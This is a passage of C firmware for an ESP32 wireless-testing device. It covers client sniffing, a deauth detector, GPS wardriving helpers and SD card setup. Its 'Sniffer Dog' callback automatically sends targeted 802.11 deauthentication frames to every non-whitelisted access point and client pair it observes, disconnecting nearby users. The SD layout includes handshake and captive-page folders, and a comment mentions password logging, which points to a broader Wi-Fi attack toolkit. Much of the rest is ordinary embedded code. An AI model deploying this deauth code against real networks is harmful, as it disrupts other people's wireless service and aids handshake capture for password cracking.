        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP MAC: %02X:%02X:%02X:%02X:%02X:%02X, Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       sniffer_packet_counter, 
                       ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
        }
        
        // Skip multicast/broadcast client MAC
        if (is_multicast_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is multicast/broadcast", sniffer_packet_counter);
            }
            return;
        }
        
        // Skip our own device as client
        if (is_own_device_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is our own device", sniffer_packet_counter);
            }
            return;
        }
        
        // Find the AP in our known list
        int ap_index = -1;
        if (should_debug) printf("DEBUG: Searching %d APs for match\n", sniffer_ap_count);
        
        for (int i = 0; i < sniffer_ap_count; i++) {
            if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                ap_index = i;
                if (should_debug) printf("DEBUG: Found AP match at index %d\n", i);
                break;
            }
        }
        
        // If AP not found, try to add it dynamically (only in normal mode)
        // In selected mode, only monitor pre-selected networks
        if (ap_index < 0 && !sniffer_selected_mode && sniffer_ap_count < MAX_SNIFFER_APS) {
            ap_index = sniffer_ap_count++;
            memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
            snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                    "Unknown_%02X%02X", ap_mac[4], ap_mac[5]); // Use last 2 bytes for unique name
            sniffer_aps[ap_index].channel = sniffer_current_channel;
            sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN; // Unknown
            sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
            sniffer_aps[ap_index].client_count = 0;
            sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
            
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s for BSSID %02X:%02X:%02X:%02X:%02X:%02X", 
                           sniffer_packet_counter, sniffer_aps[ap_index].ssid,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
        
        if (ap_index >= 0) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                           sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], 
                           client_mac[3], client_mac[4], client_mac[5], sniffer_aps[ap_index].ssid);
            }
            add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
        } else {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full (%d/%d), cannot add new AP %02X:%02X:%02X:%02X:%02X:%02X", 
                           sniffer_packet_counter, sniffer_ap_count, MAX_SNIFFER_APS,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
    }
}

// === SNIFFER DOG HELPER FUNCTIONS ===

// Channel hopping for sniffer_dog
static void sniffer_dog_channel_hop(void) {
    if (!sniffer_dog_active) {
        return;
    }
    
    // Use dual-band channel hopping
    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
    
    sniffer_dog_channel_index++;
    if (sniffer_dog_channel_index >= dual_band_channels_count) {
        sniffer_dog_channel_index = 0;
    }
    
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
}

// Task that handles channel hopping for sniffer_dog
static void sniffer_dog_task(void *pvParameters) {
    (void)pvParameters;
    int64_t sd_oled_last_us = 0;
    
    while (sniffer_dog_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_dog_active) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_dog_channel_hop();
        }
        
        // OLED update (~500ms)
        int64_t now_us = esp_timer_get_time();
        if (now_us - sd_oled_last_us > 500000) {
            sd_oled_last_us = now_us;
            if (sd_oled_dirty) {
                sd_oled_dirty = false;
                char l2[64], l3[64], l4[64];
                snprintf(l2, sizeof(l2), "AP %s", (const char *)sd_oled_ap);
                snprintf(l3, sizeof(l3), "ST %s", (const char *)sd_oled_sta);
                snprintf(l4, sizeof(l4), "Ch%d #%lu %ddB", sd_oled_ch, (unsigned long)sd_oled_count, sd_oled_rssi);
                oled_display_update_full("> Sniff Dog", l2, l3, l4);
            } else {
                char l3[64];
                snprintf(l3, sizeof(l3), "  Ch %d scanning", sniffer_dog_current_channel);
                oled_display_update_full("> Sniff Dog", "  Hunting...", l3, "  0 deauths");
            }
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer Dog channel task ending");
    sniffer_dog_task_handle = NULL;
    vTaskDelete(NULL);
}

// Promiscuous callback for sniffer_dog - captures AP-STA pairs and sends deauth
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    static uint32_t deauth_sent_count = 0;
    
    if (!sniffer_dog_active) {
        return;
    }
    
    // Filter only MGMT and DATA packets
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) { // Minimum 802.11 header size
        return;
    }
    
    // Parse 802.11 header
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses
    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
    //uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
    
    uint8_t *ap_mac = NULL;
    uint8_t *sta_mac = NULL;
    
    // Identify AP and STA based on frame type and DS bits
    if (type == WIFI_PKT_DATA) {
        // For DATA frames, use DS bits to determine direction
        if (to_ds && !from_ds) {
            // STA -> AP
            sta_mac = addr2;  // Source is STA
            ap_mac = addr1;   // Destination is AP (BSSID)
        } else if (!to_ds && from_ds) {
            // AP -> STA
            ap_mac = addr2;   // Source is AP (BSSID)
            sta_mac = addr1;  // Destination is STA
        } else if (to_ds && from_ds) {
            // WDS (Wireless Distribution System) - skip
            return;
        } else {
            // Ad-hoc or other - skip
            return;
        }
    } else if (type == WIFI_PKT_MGMT) {
        // For MGMT frames, analyze frame type
        switch (frame_type) {
            case 0x00: // Association Request
            case 0x20: // Reassociation Request
            case 0xB0: // Authentication
                sta_mac = addr2; // Source is STA
                ap_mac = addr1;  // Destination is AP
                break;
                
            case 0x10: // Association Response
            case 0x30: // Reassociation Response
                ap_mac = addr2;  // Source is AP
                sta_mac = addr1; // Destination is STA
                break;
                
            case 0x80: // Beacon
            case 0x40: // Probe Request
            case 0x50: // Probe Response
                // Skip - not AP-STA pairs
                return;
                
            default:
                // Unknown or not relevant
                return;
        }
    }
    
    // Validate AP and STA addresses
    if (!ap_mac || !sta_mac) {
        return;
    }
    
    // Skip broadcast/multicast addresses
    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
        return;
    }
    
    // Check if AP BSSID is whitelisted - skip if it is
    if (is_bssid_whitelisted(ap_mac)) {
        return; // Silently skip whitelisted networks
    }
    
    // We have a valid AP-STA pair! Send 5 deauth packets
    // Create deauth frame from AP to STA (not broadcast!)
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    // Set destination to specific STA (not broadcast!)
    memcpy(&deauth_frame[4], sta_mac, 6);
    // Set source to AP
    memcpy(&deauth_frame[10], ap_mac, 6);
    // Set BSSID to AP
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    // Send deauth frame for more effective disconnection

    // Blue LED flash to indicate deauth sent
    (void)led_set_color(0, 0, 255); // Blue

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    deauth_sent_count++;
    
    // Update shared OLED state for task to render
    snprintf((char *)sd_oled_ap, sizeof(sd_oled_ap), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    snprintf((char *)sd_oled_sta, sizeof(sd_oled_sta), "%02X:%02X:%02X:%02X:%02X:%02X",
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
    sd_oled_ch = sniffer_dog_current_channel;
    sd_oled_rssi = pkt->rx_ctrl.rssi;
    sd_oled_count = deauth_sent_count;
    sd_oled_dirty = true;
    
    (void)led_set_color(255, 0, 0); // Back to red
    
    // Log statistics for this AP-STA pair
    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
               deauth_sent_count,
               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
               sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
               sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
}

// === DEAUTH DETECTOR FUNCTIONS ===

// Helper function to find SSID by BSSID from scan results
static const char* deauth_detector_find_ssid_by_bssid(const uint8_t *bssid) {
    for (int i = 0; i < g_scan_count; i++) {
        if (memcmp(g_scan_results[i].bssid, bssid, 6) == 0) {
            return (const char*)g_scan_results[i].ssid;
        }
    }
    return NULL; // Unknown AP
}

static void deauth_detector_channel_hop(void) {
    if (!deauth_detector_active) {
        return;
    }
    
    // Check if we're in selected channels mode
    if (deauth_detector_selected_mode && deauth_detector_selected_channels_count > 0) {
        // Use selected channels only
        deauth_detector_current_channel = deauth_detector_selected_channels[deauth_detector_channel_index];
        
        deauth_detector_channel_index++;
        if (deauth_detector_channel_index >= deauth_detector_selected_channels_count) {
            deauth_detector_channel_index = 0;
        }
    } else {
        // Use dual-band channel hopping (all channels)
        deauth_detector_current_channel = dual_band_channels[deauth_detector_channel_index];
        
        deauth_detector_channel_index++;
        if (deauth_detector_channel_index >= dual_band_channels_count) {
            deauth_detector_channel_index = 0;
        }
    }
    
    esp_wifi_set_channel(deauth_detector_current_channel, WIFI_SECOND_CHAN_NONE);
    deauth_detector_last_channel_hop = esp_timer_get_time() / 1000;
}

// Task that handles channel hopping for deauth_detector
static void deauth_detector_task(void *pvParameters) {
    (void)pvParameters;
    
    log_memory_info("deauth_detector_task");
    int64_t dd_oled_last_us = 0;
    
    while (deauth_detector_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!deauth_detector_active) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - deauth_detector_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            deauth_detector_channel_hop();
            // Reset LED to yellow after channel hop (in case it was red from deauth detection)
            (void)led_set_color(255, 255, 0);
        }
        
        // OLED update (~500ms)
        int64_t now_us = esp_timer_get_time();
        if (now_us - dd_oled_last_us > 500000) {
            dd_oled_last_us = now_us;
            if (dd_oled_dirty) {
                dd_oled_dirty = false;
                char l2[64], l3[64], l4[64];
                snprintf(l2, sizeof(l2), ">> %s", (const char *)dd_oled_ssid);
                snprintf(l3, sizeof(l3), "  %s", (const char *)dd_oled_bssid);
                snprintf(l4, sizeof(l4), "Ch%d %ddB #%lu", dd_oled_ch, dd_oled_rssi, (unsigned long)dd_oled_count);
                oled_display_update_full("> Deauth Detect", l2, l3, l4);
            } else {
                char l3[64];
                snprintf(l3, sizeof(l3), "  Ch %d scanning", deauth_detector_current_channel);
                oled_display_update_full("> Deauth Detect", "  Monitoring...", l3, "  No attacks yet");
            }
        }
    }
    
    MY_LOG_INFO(TAG, "Deauth detector channel task ending");
    deauth_detector_task_handle = NULL;
    vTaskDelete(NULL);
}

// Promiscuous callback for deauth_detector - detects deauthentication frames
static void deauth_detector_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!deauth_detector_active) {
        return;
    }
    
    // Filter only MGMT packets (deauth is a management frame)
    if (type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) { // Minimum 802.11 header size
        return;
    }
    
    // Check if this is a deauthentication frame
    // Frame Control: Type=0 (Management), Subtype=12 (Deauthentication)
    // Frame Control byte 0: 0xC0 = (subtype << 4) | (type << 2) = (12 << 4) | (0 << 2) = 0xC0
    uint8_t frame_type = frame[0] & 0xFC;
    if (frame_type != 0xC0) {
        return; // Not a deauthentication frame
    }
    
    // Extract BSSID (Address 3 in management frames)
    // 802.11 header: FC(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)
    // Addr3 is at offset 16
    const uint8_t *bssid_mac = &frame[16];
    
    // Get RSSI from rx_ctrl
    int rssi = pkt->rx_ctrl.rssi;
    
    // Lookup SSID by BSSID from scan results
    const char *ssid = deauth_detector_find_ssid_by_bssid(bssid_mac);
    const char *ap_name = (ssid && ssid[0] != '\0') ? ssid : "<Unknown>";
    
    // Throttle LED flash - only flash red if 100ms passed since last flash
    // This prevents RMT channel conflicts when deauth frames come rapidly
    static int64_t last_led_flash_time = 0;
    int64_t now = esp_timer_get_time() / 1000; // ms
    
    if (now - last_led_flash_time >= 100) {
        (void)led_set_color(255, 0, 0); // Red flash
        last_led_flash_time = now;
    }
    
    // Update shared OLED state for task to render
    snprintf((char *)dd_oled_ssid, sizeof(dd_oled_ssid), "%s", ap_name);
    snprintf((char *)dd_oled_bssid, sizeof(dd_oled_bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid_mac[0], bssid_mac[1], bssid_mac[2], bssid_mac[3], bssid_mac[4], bssid_mac[5]);
    dd_oled_ch = deauth_detector_current_channel;
    dd_oled_rssi = rssi;
    dd_oled_count++;
    dd_oled_dirty = true;
    
    // Print detection: CHANNEL | AP NAME (MAC) | RSSI
    MY_LOG_INFO(TAG, "[DEAUTH] CH: %d | AP: %s (%02X:%02X:%02X:%02X:%02X:%02X) | RSSI: %d",
               deauth_detector_current_channel,
               ap_name,
               bssid_mac[0], bssid_mac[1], bssid_mac[2], bssid_mac[3], bssid_mac[4], bssid_mac[5],
               rssi);
    
    // Note: LED reset to yellow is handled by the task after channel hop
}

// === WARDRIVE HELPER FUNCTIONS ===

static const char *gps_get_module_name(gps_module_t module) {
    switch (module) {
        case GPS_MODULE_M5STACK_GPS_V11:
            return "M5StackGPS1.1";
        case GPS_MODULE_EXTERNAL:
            return "External";
        case GPS_MODULE_EXTERNAL_CAP:
            return "ExternalCap";
        case GPS_MODULE_ATGM336H:
        default:
            return "ATGM336H";
    }
}

static bool gps_module_uses_external_feed(gps_module_t module) {
    return (module == GPS_MODULE_EXTERNAL || module == GPS_MODULE_EXTERNAL_CAP);
}

static bool gps_module_uses_external_cap_feed(gps_module_t module) {
    return module == GPS_MODULE_EXTERNAL_CAP;
}

static const char *gps_external_position_command_name(gps_module_t module) {
    return gps_module_uses_external_cap_feed(module) ? "set_gps_position_cap" : "set_gps_position";
}

static void gps_sync_from_selected_external_source(void) {
    if (!gps_module_uses_external_feed(current_gps_module)) {
        return;
    }

    if (gps_module_uses_external_cap_feed(current_gps_module)) {
        current_gps = external_cap_gps_position;
    } else {
        current_gps = external_gps_position;
    }
}

static int gps_get_baud_for_module(gps_module_t module) {
    switch (module) {
        case GPS_MODULE_M5STACK_GPS_V11:
            return GPS_BAUD_M5STACK;
        case GPS_MODULE_EXTERNAL:
        case GPS_MODULE_EXTERNAL_CAP:
            // In external mode wardrive does not read GPS UART. Keep safe fallback.
            return GPS_BAUD_ATGM336H;
        case GPS_MODULE_ATGM336H:
        default:
            return GPS_BAUD_ATGM336H;
    }
}

static esp_err_t init_gps_uart(int baud_rate) {
    int effective_baud = (baud_rate > 0) ? baud_rate : GPS_BAUD_ATGM336H;
    uart_config_t uart_config = {
        .baud_rate = effective_baud,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    // Always reinstall driver to ensure clean queues when switching modules/baud without reboot
    if (gps_uart_initialized) {
        uart_driver_delete(GPS_UART_NUM);
        gps_uart_initialized = false;
    }

    esp_err_t err = uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0);
    if (err != ESP_OK) {
        return err;
    }
    gps_uart_initialized = true;

    err = uart_param_config(GPS_UART_NUM, &uart_config);
    if (err != ESP_OK) {
        return err;
    }

    err = uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    if (err != ESP_OK) {
        return err;
    }

    err = uart_set_baudrate(GPS_UART_NUM, effective_baud);
    if (err != ESP_OK) {
        return err;
    }

    uart_flush_input(GPS_UART_NUM);
    return ESP_OK;
}

static void gps_save_state_to_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(GPS_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "GPS cfg NVS open failed: %s", esp_err_to_name(err));
        return;
    }
    err = nvs_set_u8(handle, GPS_NVS_KEY_MODULE, (uint8_t)current_gps_module);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "GPS cfg NVS save failed: %s", esp_err_to_name(err));
    }
}

static void gps_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(GPS_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "GPS cfg NVS read open failed: %s", esp_err_to_name(err));
        return;
    }
    uint8_t module_val = (uint8_t)current_gps_module;
    err = nvs_get_u8(handle, GPS_NVS_KEY_MODULE, &module_val);
    nvs_close(handle);
    if (err == ESP_OK && module_val <= GPS_MODULE_EXTERNAL_CAP) {
        current_gps_module = (gps_module_t)module_val;
    }
}

// Flush FAT filesystem buffers to SD card to ensure metadata consistency.
// ESP-IDF newlib does not implement POSIX sync(), so we force a flush by
// opening a temporary file, calling fsync() on its descriptor (which
// triggers FatFs f_sync and flushes the FAT table), then removing it.
static void sd_sync(void) {
    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        fsync(fd);
        close(fd);
        unlink("/sdcard/.sync");
    }
}

// Safely unmount SD card and restart to prevent FAT filesystem corruption
static void safe_restart(void) {
    if (sd_card_mounted && sd_card_handle) {
        MY_LOG_INFO(TAG, "Unmounting SD card before restart...");
        esp_vfs_fat_sdcard_unmount("/sdcard", sd_card_handle);
        sd_card_mounted = false;
        sd_card_handle = NULL;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
}

static esp_err_t init_sd_card(void) {
    esp_err_t ret;
    
    // Check if SD card is already mounted
    if (sd_card_mounted) {
        return ESP_OK;
    }
    
    // Options for mounting the filesystem (optimized for low memory)
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = false,  // Don't format automatically to save memory
        .max_files = 5,                   // Increased to 5 for password logging
        .allocation_unit_size = 0,        // Use default (512 bytes) to save memory
        .disk_status_check_enable = false
    };
    
    const char mount_point[] = "/sdcard";
    
    // Configure SPI bus (balanced for SD card requirements and memory)
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = SD_MOSI_PIN,
        .miso_io_num = SD_MISO_PIN,
        .sclk_io_num = SD_CLK_PIN,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 4096,  // SD card needs at least 4KB for sector operations
    };
    
    ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);  // DMA required for SD card
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Initialize the SD card host
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI2_HOST;
    
    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = SD_CS_PIN;
    slot_config.host_id = host.slot;

    // Some cards are unstable at higher SPI clock rates during init.
    const int mount_freqs_khz[] = {SDMMC_FREQ_DEFAULT, 10000, 4000};
    const size_t mount_freqs_count = sizeof(mount_freqs_khz) / sizeof(mount_freqs_khz[0]);
    for (size_t i = 0; i < mount_freqs_count; i++) {
        host.max_freq_khz = mount_freqs_khz[i];
        ret = esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config, &mount_config, &sd_card_handle);
        if (ret == ESP_OK) {
            break;
        }
        MY_LOG_INFO(TAG, "SD mount attempt %u failed at %d kHz: %s",
                    (unsigned)(i + 1), host.max_freq_khz, esp_err_to_name(ret));
        vTaskDelay(pdMS_TO_TICKS(60));
    }
    
    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            MY_LOG_INFO(TAG, "Failed to mount SD filesystem at /sdcard (unsupported/corrupted FS).");
        } else {
            MY_LOG_INFO(TAG, "Failed to initialize SD card (%s). Check wiring, pull-ups, and card compatibility.",
                        esp_err_to_name(ret));
        }
        return ret;
    }
    
    // Print card info
    MY_LOG_INFO(TAG, "SD card mounted successfully");
    sdmmc_card_print_info(stdout, sd_card_handle);
    
    // Test file creation to verify write access
    FILE *test_file = fopen("/sdcard/test.txt", "w");
    if (test_file != NULL) {
        fprintf(test_file, "Test write\n");
        fclose(test_file);
        MY_LOG_INFO(TAG, "SD card write test successful");
        // Clean up test file
        unlink("/sdcard/test.txt");
        sd_sync();
    } else {
        MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
    }
    
    // Mark SD card as successfully mounted
    sd_card_mounted = true;
    
    return ESP_OK;
}

// Create necessary directories on SD card
static esp_err_t create_sd_directories(void) {
    struct stat st;
    
    MY_LOG_INFO(TAG, "Checking and creating SD card directories...");
    
    // Create /sdcard/lab directory
    if (stat("/sdcard/lab", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab directory...");
        if (mkdir("/sdcard/lab", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        sd_sync();
        MY_LOG_INFO(TAG, "/sdcard/lab created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab already exists");
    }
    
    // Create /sdcard/lab/htmls directory
    if (stat("/sdcard/lab/htmls", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/htmls directory...");
        if (mkdir("/sdcard/lab/htmls", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/htmls directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        sd_sync();
        MY_LOG_INFO(TAG, "/sdcard/lab/htmls created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/htmls already exists");
    }
    
    // Create /sdcard/lab/handshakes directory
    if (stat("/sdcard/lab/handshakes", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/handshakes directory...");
        if (mkdir("/sdcard/lab/handshakes", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/handshakes directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        sd_sync();
        MY_LOG_INFO(TAG, "/sdcard/lab/handshakes created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/handshakes already exists");
    }
    
    // Create /sdcard/lab/wardrives directory
    if (stat("/sdcard/lab/wardrives", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/wardrives directory...");
        if (mkdir("/sdcard/lab/wardrives", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/wardrives directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        sd_sync();
        MY_LOG_INFO(TAG, "/sdcard/lab/wardrives created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/wardrives already exists");
    }
    
    // Create /sdcard/lab/pcaps directory
    if (stat("/sdcard/lab/pcaps", &st) != 0) {
        MY_LOG_INFO(TAG, "Creating /sdcard/lab/pcaps directory...");
        if (mkdir("/sdcard/lab/pcaps", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/pcaps directory: %s", strerror(errno));
            return ESP_FAIL;
        }
        sd_sync();
        MY_LOG_INFO(TAG, "/sdcard/lab/pcaps created successfully");
    } else {
        MY_LOG_INFO(TAG, "/sdcard/lab/pcaps already exists");
    }
    
    MY_LOG_INFO(TAG, "All required directories are ready");
    return ESP_OK;
}

static bool parse_gps_nmea(const char* nmea_sentence) {
    if (!nmea_sentence || strlen(nmea_sentence) < 10) {
        return false;
    }
    
    // Parse GPGGA sentence for basic GPS data
    if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
        char sentence[256];
        strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
        sentence[sizeof(sentence) - 1] = '\0';
        
        char *token = strtok(sentence, ",");
        int field = 0;
        float lat_deg = 0, lat_min = 0;
        float lon_deg = 0, lon_min = 0;
        char lat_dir = 'N', lon_dir = 'E';
        int quality = 0;
        float altitude = 0;
        float hdop = 1.0;
        
        while (token != NULL) {
            switch (field) {
                case 2: // Latitude DDMM.MMMM
                    if (strlen(token) > 4) {
                        lat_deg = (token[0] - '0') * 10 + (token[1] - '0');
                        lat_min = atof(token + 2);
                    }
                    break;
                case 3: // Latitude direction
                    lat_dir = token[0];
                    break;
                case 4: // Longitude DDDMM.MMMM
                    if (strlen(token) > 5) {
                        lon_deg = (token[0] - '0') * 100 + (token[1] - '0') * 10 + (token[2] - '0');
                        lon_min = atof(token + 3);
                    }
                    break;
                case 5: // Longitude direction
                    lon_dir = token[0];
                    break;
                case 6: // GPS quality
                    quality = atoi(token);
                    break;
                case 7: // Number of satellites
                    current_gps.satellites = atoi(token);
                    break;
                case 8: // HDOP
                    hdop = atof(token);
                    break;
                case 9: // Altitude
                    altitude = atof(token);
                    break;
            }
            token = strtok(NULL, ",");
            field++;
        }
        
        if (quality > 0) {
            // Convert to decimal degrees
            current_gps.latitude = lat_deg + lat_min / 60.0;
            if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
            
            current_gps.longitude = lon_deg + lon_min / 60.0;
            if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
            
            current_gps.altitude = altitude;
            current_gps.accuracy = hdop * 4.0; // Rough accuracy estimate
            current_gps.valid = true;
            
            return true;
        } else {
            current_gps.satellites = 0;
            current_gps.valid = false;
            return false;
        }
    }
    
    return false;
}

static void get_timestamp_string(char* buffer, size_t size) {
    // For now, use a simple counter-based timestamp
    // In a real implementation, you'd use RTC or NTP time
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    
    // Format as a simple date-time string
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    bool infinite = (timeout_seconds <= 0);
    const bool external_feed = gps_module_uses_external_feed(current_gps_module);

    if (!external_feed) {
        current_gps.valid = false;
    }
    
    if (infinite && external_feed) {
        MY_LOG_INFO(TAG, "Waiting for GPS fix (external feed, no timeout, use '%s' or 'stop')...",
                    gps_external_position_command_name(current_gps_module));
    } else if (infinite) {
        MY_LOG_INFO(TAG, "Waiting for GPS fix (no timeout, use 'stop' to cancel)...");
    } else if (external_feed) {
